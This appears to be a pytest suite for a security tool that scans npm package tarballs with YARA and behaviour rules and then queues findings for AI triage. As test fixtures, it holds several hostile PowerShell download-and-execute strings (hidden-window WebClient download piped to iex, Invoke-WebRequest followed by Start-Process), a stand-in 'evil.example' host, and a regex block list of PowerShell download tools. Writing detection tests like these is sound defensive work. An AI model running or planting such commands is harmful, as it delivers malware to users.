import io
import json
import tarfile

import pytest

import soc_store
from secopsai import research_ai_triage, research_funnel, yara_engine
from secopsai.research_intake import SafeFetcher

yara_x = pytest.importorskip("yara_x")


def _tgz(files):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def test_yara_scans_binary_members_that_text_decoding_dropped(tmp_path, monkeypatch):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "t.yar").write_text('rule Test_Implant { meta: author = "Analyst A" score = 85 strings: $a = { 4D 5A 90 00 } condition: $a at 0 }')
    monkeypatch.setenv("SECOPSAI_YARA_RULE_DIRS", str(rules))
    yara_engine.load(force=True)
    try:
        result = yara_engine.scan_files([("package/dist/implant.exe", b"MZ\x90\x00" + b"\xff" * 64)])
    finally:
        monkeypatch.delenv("SECOPSAI_YARA_RULE_DIRS")
        yara_engine.load(force=True)
    assert result["level"] == "alert" and result["score"] == 85
    assert result["findings"][0]["rule_author"] == "Analyst A", "DRL attribution must survive"


def test_prescan_flags_hits_and_clears_clean_releases(tmp_path):
    bad = _tgz({"package/package.json": b"{}", "package/x.ps1": b"powershell -WindowStyle Hidden -c Invoke-WebRequest http://a/b.exe -OutFile b.exe; Start-Process b.exe"})
    good = _tgz({"package/package.json": b"{}", "package/index.js": b"module.exports = 1;"})
    blobs = {"https://registry.npmjs.org/bad/-/bad-1.0.0.tgz": bad, "https://registry.npmjs.org/good/-/good-1.0.0.tgz": good}
    fetcher = SafeFetcher(fetch=lambda url, _max: (200, {"content-type": "application/octet-stream"}, blobs[url]))
    results = research_funnel.prescan([
        {"key": "E1", "package": "bad", "version": "1.0.0", "tarball": "https://registry.npmjs.org/bad/-/bad-1.0.0.tgz"},
        {"key": "E2", "package": "good", "version": "1.0.0", "tarball": "https://registry.npmjs.org/good/-/good-1.0.0.tgz"},
        {"key": "E3", "package": "elsewhere", "version": "1.0.0", "tarball": "https://evil.example/x.tgz"},
    ], fetcher=fetcher, workers=2)
    assert results["E1"]["status"] == "hit" and results["E1"]["findings"]
    assert results["E2"]["status"] == "clean"
    assert results["E3"]["status"] == "skipped", "only registry-hosted archives are fetched"


class _FakeCore:
    enabled = True

    def __init__(self):
        self.queued = []

    def queue_triage_jobs(self, jobs):
        self.queued.extend(jobs)
        return {"queued": [{"artifact_id": job["artifact_id"], "job_id": f"AIJ-{i}"} for i, job in enumerate(jobs)]}

    def triage_results(self, *, since="", limit=100):
        return {"results": [
            {"artifact_id": "npm:quiet@1.0.0", "status": "succeeded", "updated_at": "2026-10-10T01:00:00Z", "job_id": "AIJ-0", "result": {"finding_verdict": "false_positive", "finding_confidence": 92, "summary": "Source map data URI"}},
            {"artifact_id": "npm:loud@2.0.0", "status": "succeeded", "updated_at": "2026-10-10T01:01:00Z", "job_id": "AIJ-1", "result": {"finding_verdict": "true_positive", "finding_confidence": 80}},
        ] if not since else [], "pending": 0}


def test_ai_triage_round_trip_resolves_benign_and_escalates_suspicious(tmp_path):
    db = str(tmp_path / "research.db")
    soc_store.init_db(db)
    with soc_store.connect(db) as connection:
        for alert_id, package, version in (("RAL-1", "quiet", "1.0.0"), ("RAL-2", "loud", "2.0.0")):
            connection.execute(
                "INSERT INTO research_alerts (alert_id, alert_type, severity, dedupe_key, reason, evidence_json, status, owner, created_at, updated_at) VALUES (?, 'npm_proactive_anomaly', 'high', ?, 'r', ?, 'open', '', 't', 't')",
                (alert_id, alert_id, json.dumps({"package": package, "version": version})),
            )
        connection.commit()
    for package, version in (("quiet", "1.0.0"), ("loud", "2.0.0")):
        research_ai_triage.record_hit(ecosystem="npm", package=package, version=version, prescan={"score": 60, "level": "warning", "findings": [{"rule_id": "YARA:X", "safe_context": "..."}]}, db_path=db)
    core = _FakeCore()
    summary = research_ai_triage.sync(core, db_path=db)
    assert summary["queued"] == 2 and summary["resolved"] == 1 and summary["escalated"] == 1
    assert core.queued[0]["inputs"]["artifact_triage"]["findings"][0]["rule_id"] == "YARA:X"
    with soc_store.connect(db) as connection:
        status = dict(connection.execute("SELECT alert_id, status FROM research_alerts").fetchall())
        note = json.loads(connection.execute("SELECT json_extract(evidence_json, '$.ai_triage') FROM research_alerts WHERE alert_id='RAL-2'").fetchone()[0])
    assert status == {"RAL-1": "resolved", "RAL-2": "open"}
    assert note["verdict"] == "suspicious"
    assert research_ai_triage.sync(core, db_path=db)["results"] == 0, "cursor prevents re-applying results"


def test_powershell_rule_needs_staging_and_skips_documentation():
    staging = b"exec('powershell -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadString(\\'http://x/p.ps1\\') | iex\"')"
    instructions = b"Install: powershell -c \"Invoke-WebRequest https://x/i.ps1 | iex\" -WindowStyle Hidden"
    guard = b"const blocked = /\\b(?:Invoke-WebRequest|irm)\\b/; // powershell -NoProfile | iex Start-Process"
    hits = lambda path, data: [f for f in yara_engine.scan_files([(path, data)])["findings"] if "PowerShell_Download" in f["rule_id"]]
    found = hits("package/install.js", staging)
    assert found and {"$ps", "$ex2", "$ev1"} <= set(found[0]["matched_patterns"])
    assert "[...]" not in found[0]["safe_context"] or found[0]["safe_context"].count("[...]") <= 2
    assert not hits("package/README.md", instructions)
    assert not hits("package/lib/guard.js", guard)


def test_manifest_summary_and_file_roles():
    manifest = research_funnel.manifest_summary([
        ("package/package.json", json.dumps({"name": "x", "main": "lib/index.js", "bin": {"x": "./bin/x.js"},
                                              "scripts": {"postinstall": "node setup.js", "test": "jest"}}).encode()),
        ("package/setup.js", b""),
    ])
    assert manifest["install_scripts"] == {"postinstall": "node setup.js"} and manifest["other_scripts"] == ["test"]
    role = lambda path: research_funnel.file_role(path, manifest)
    assert role("package/setup.js") == "install_script"
    assert role("package/bin/x.js") == "entry_point"
    assert role("package/lib/index.js") == "entry_point"
    assert role("package/README.md") == "documentation"
    assert role("package/dist/app.js.map") == "source_map"
    assert role("package/lib/util.js") == "code"
    assert research_funnel.manifest_summary([("package/package.json", b"{bad")]) == {"parse_error": True}


def test_rule_health_flags_rules_that_keep_firing_on_benign_code(tmp_path):
    db_path = str(tmp_path / "soc.db")
    soc_store.init_db(db_path)
    for index in range(6):
        key = research_ai_triage.record_hit(ecosystem="npm", package=f"p{index}", version="1.0.0",
                                            prescan={"score": 60, "findings": [{"rule_id": "BEHAVIOUR:BEH_NOISY"}]}, db_path=db_path)
        with soc_store.connect(db_path) as connection:
            connection.execute("UPDATE research_ai_triage SET status='triaged', verdict=? WHERE artifact_key=?", ("benign" if index else "suspicious", key))
    health = research_ai_triage.rule_health(db_path=db_path)
    assert health["noisy"] == ["BEHAVIOUR:BEH_NOISY"]
    with soc_store.connect(db_path) as connection:
        alert = connection.execute("SELECT alert_type, reason FROM research_alerts").fetchone()
    assert alert["alert_type"] == "rule_noisy" and "5 of 6" in alert["reason"]


def test_retriage_retires_clean_requeues_strong_and_keeps_labels(tmp_path):
    db_path = str(tmp_path / "soc.db")
    soc_store.init_db(db_path)
    for name, score in (("gone", 60), ("strong", 90), ("weak", 50)):
        key = research_ai_triage.record_hit(ecosystem="npm", package=name, version="1.0.0", prescan={"score": score, "findings": [{"rule_id": "BEHAVIOUR:X"}]}, db_path=db_path)
        with soc_store.connect(db_path) as connection:
            connection.execute("UPDATE research_ai_triage SET status='triaged', verdict='inconclusive', job_id='AIJ-1' WHERE artifact_key=?", (key,))
            connection.execute("INSERT INTO research_alerts (alert_id, alert_type, severity, dedupe_key, reason, evidence_json, status, owner, created_at, updated_at) VALUES (?, 'registry_release_anomaly', 'high', ?, 'r', ?, 'open', '', 't', 't')",
                               (f"RAL-{name}", f"d-{name}", json.dumps({"package": name, "version": "1.0.0"})))

    def scanner(_fetcher, _eco, package, _version):
        return {"gone": {"status": "clean", "features": ["tiny_package"]},
                "strong": {"status": "hit", "score": 95, "level": "alert", "rules_matched": ["BEH_X"], "findings": [{"rule_id": "BEHAVIOUR:BEH_X"}], "install_files": [{"path": "package/i.js", "content": "x"}]},
                "weak": {"status": "hit", "score": 60, "level": "warning", "rules_matched": ["BEH_Y"], "findings": []}}[package]

    stats = research_ai_triage.retriage(db_path=db_path, scanner=scanner)
    assert stats == {"rescanned": 3, "retired": 1, "requeued": 1, "refreshed": 1, "unavailable": 0}
    with soc_store.connect(db_path) as connection:
        rows = {r["package"]: dict(r) for r in connection.execute("SELECT * FROM research_ai_triage")}
        alerts = {r["alert_id"]: r["status"] for r in connection.execute("SELECT alert_id, status FROM research_alerts")}
        labels = {r["artifact_key"]: r["label"] for r in connection.execute("SELECT artifact_key, label FROM rule_training_labels")}
    assert rows["gone"]["status"] == "retired" and alerts["RAL-gone"] == "resolved"
    assert rows["strong"]["status"] == "pending" and json.loads(rows["strong"]["context_json"])["revision"] == 1
    assert json.loads(rows["strong"]["context_json"])["install_time_files"][0]["path"] == "package/i.js"
    assert rows["weak"]["status"] == "triaged" and alerts["RAL-weak"] == "open"
    assert len(labels) == 3
    assert research_ai_triage.retriage(db_path=db_path, scanner=scanner)["rescanned"] == 0, "already rescanned items are not redone"

    class Core:
        enabled = True
        jobs = []

        def queue_triage_jobs(self, jobs):
            self.jobs.extend(jobs)
            return {"queued": [{"artifact_id": job["artifact_id"], "job_id": "AIJ-2"} for job in jobs]}

    core = Core()
    research_ai_triage._queue_pending(core, db_path)
    assert core.jobs[0]["idempotency_key"] == "runner-triage:npm:strong@1.0.0:r1", "a re-triage is a new job for Core"


def test_triage_contexts_fit_cores_input_limit():
    big = {"findings": [{"rule_id": f"R{i}", "safe_context": "x" * 5000} for i in range(20)],
           "install_time_files": [{"path": f"f{i}.js", "content": "y" * 6000} for i in range(6)], "metadata_signals": [{"id": "s"}] * 20}
    fitted = research_ai_triage.fit_context(big)
    assert fitted["context_bytes"] <= research_ai_triage.MAX_CONTEXT_BYTES
    assert fitted["findings"] and fitted["install_time_files"], "shrinks, does not discard everything"


def test_malicious_probability_resolves_or_escalates(tmp_path):
    db_path = str(tmp_path / "soc.db")
    soc_store.init_db(db_path)
    for name in ("low", "mid", "high", "missing"):
        research_ai_triage.record_hit(ecosystem="npm", package=name, version="1", prescan={"score": 60, "findings": []}, db_path=db_path)
        with soc_store.connect(db_path) as connection:
            connection.execute("INSERT INTO research_alerts (alert_id, alert_type, severity, dedupe_key, reason, evidence_json, status, owner, created_at, updated_at) VALUES (?, 'registry_release_anomaly', 'high', ?, 'r', ?, 'open', '', 't', 't')",
                               (f"RAL-{name}", f"d-{name}", json.dumps({"package": name, "version": "1"})))
    now = "2026-10-11T00:00:00Z"
    with soc_store.connect(db_path) as connection:
        for name, probability in (("low", 4), ("mid", 22), ("high", 85), ("missing", None)):
            result = {"finding_verdict": "needs_more_evidence", "finding_confidence": 60}
            if probability is not None:
                result["malicious_probability"] = probability
            research_ai_triage._apply_result(connection, {"artifact_id": f"npm:{name}@1", "status": "succeeded", "result": result}, now)
        connection.commit()
        alerts = {r["alert_id"]: (r["status"], r["severity"]) for r in connection.execute("SELECT alert_id, status, severity FROM research_alerts")}
        verdicts = {r["package"]: r["verdict"] for r in connection.execute("SELECT package, verdict FROM research_ai_triage")}
    assert alerts == {"RAL-low": ("resolved", "high"), "RAL-mid": ("open", "low"), "RAL-high": ("open", "high"), "RAL-missing": ("open", "high")}
    assert verdicts == {"low": "likely_benign", "mid": "inconclusive", "high": "suspicious", "missing": "inconclusive"}
